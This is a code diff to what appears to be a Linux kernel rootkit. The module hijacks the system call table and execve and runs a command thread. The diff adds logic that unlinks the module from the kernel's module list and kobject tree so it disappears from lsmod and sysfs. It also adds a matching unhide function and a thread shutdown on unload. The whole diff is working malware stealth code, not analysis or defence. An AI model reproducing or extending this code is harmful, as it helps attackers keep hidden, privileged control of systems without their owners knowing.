@@ -16,7 +16,10 @@
 
 struct task_struct *rk_kthread;
 unsigned long *syscall_table = NULL;
+unsigned int hidden = 0;
 pte_t *pte;
+static struct list_head *module_previous;
+static struct list_head *module_kobj_previous;
 
 extern unsigned long __force_order;
 
@@ -67,10 +70,28 @@ rk_start_cmd_thread(void)
 void
 rk_hide(void)
 {
+	if (hidden) return;
+	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
+	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
 	kobject_del(&THIS_MODULE->mkobj.kobj);
-	THIS_MODULE->sect_attrs = NULL;
-	THIS_MODULE->notes_attrs = NULL;
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+
+	hidden = 1;
+}
+
+// TODO: Add a way to call this function.
+// TODO: Maybe implement a device like /dev/null but with hidden features.
+void
+rk_unhide(void)
+{
+	int _;
+	if (!hidden) return;
+	list_add(&THIS_MODULE->list, module_previous);
+	_ = kobject_add(&THIS_MODULE->mkobj.kobj,
+			     THIS_MODULE->mkobj.kobj.parent, "rt");
+
+	hidden = 0;
 }
 
 inline void rk_write_cr0(unsigned long cr0) {
@@ -157,6 +178,7 @@ rk_exit(void)
 	pr_info("%s: module un-loaded at 0x%p\n", RK_NAME, rk_exit);
 #endif
 	rk_unhijack_execve();
+	kthread_stop(rk_kthread);
 }
 
 module_init(rk_init);
